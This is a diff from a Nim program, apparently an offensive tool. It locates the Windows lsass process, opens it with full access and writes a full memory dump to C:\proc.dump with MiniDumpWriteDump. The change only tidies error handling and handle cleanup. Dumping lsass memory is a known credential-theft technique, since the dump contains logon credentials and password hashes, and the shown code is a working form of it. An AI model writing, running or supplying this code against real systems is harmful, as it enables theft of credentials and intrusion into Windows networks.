@@ -53,19 +53,26 @@ when isMainModule:
         echo "[X] Unable to find lsass process"
         quit(1)
 
-    echo "[*] lsass process PID: ", processId
-    var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
-    var fs = open(r"C:\proc.dump", fmWrite)
-    
-    var success = MiniDumpWriteDump(
-        hProcess,
-        cast[DWORD](processId),
-        fs.getOsFileHandle(),
-        MiniDumpWithFullMemory,
-        0,
-        0,
-        0
-    )
+    echo "[*] lsass PID: ", processId
 
-    fs.close()
-    echo "[*] Dump successful: ", bool(success)
+    var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
+    if not bool(hProcess):
+        echo "[X] Unable to open handle to process"
+        quit(1)
+
+    try:
+        var fs = open(r"C:\proc.dump", fmWrite)
+        echo "[*] Creating memory dump, please wait..."
+        var success = MiniDumpWriteDump(
+            hProcess,
+            cast[DWORD](processId),
+            fs.getOsFileHandle(),
+            MiniDumpWithFullMemory,
+            0,
+            0,
+            0
+        )
+        echo "[*] Dump successful: ", bool(success)
+        fs.close()
+    finally:
+        CloseHandle(hProcess)
